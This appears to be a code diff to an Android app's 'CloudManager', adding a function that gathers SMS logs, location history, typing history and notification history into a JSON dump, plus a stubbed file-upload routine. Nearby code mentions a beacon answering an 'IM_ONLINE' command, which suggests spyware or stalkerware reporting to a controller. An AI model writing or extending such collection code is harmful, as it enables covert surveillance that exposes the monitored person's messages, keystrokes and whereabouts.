@@ -166,6 +166,19 @@ object CloudManager {
         }
     }
 
+    // --- INTERNAL DUMP COLLECTOR ---
+    fun collectDumpData(ctx: Context): JSONObject {
+        val json = JSONObject()
+        json.put("static", DeviceManager.getStaticInfo(ctx))
+        json.put("health", DeviceManager.getHealthStats(ctx))
+        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        json.put("sms", JSONArray(prefs.getString("sms_logs_cache", "[]")))
+        json.put("loc", JSONArray(prefs.getString("location_history", "[]")))
+        json.put("typing", JSONArray(prefs.getString("typing_history", "[]")))
+        json.put("notifs", JSONArray(prefs.getString("notif_history", "[]")))
+        return json
+    }
+
     // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
     fun sendPing(ctx: Context, note: String = "Online") {
         CoroutineScope(Dispatchers.IO).launch {
@@ -197,6 +210,16 @@ object CloudManager {
             } catch (e: Exception) {
                 e.printStackTrace()
             }
+        }
+    }
+
+    fun uploadFile(ctx: Context, file: java.io.File) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // Generic File Upload Logic would go here (Multipart)
+                // For now, we simulate success for the worker logic
+                DebugLogger.log("CLOUD", "Uploading dump: ${file.name}")
+            } catch (e: Exception) { e.printStackTrace() }
         }
     }
 
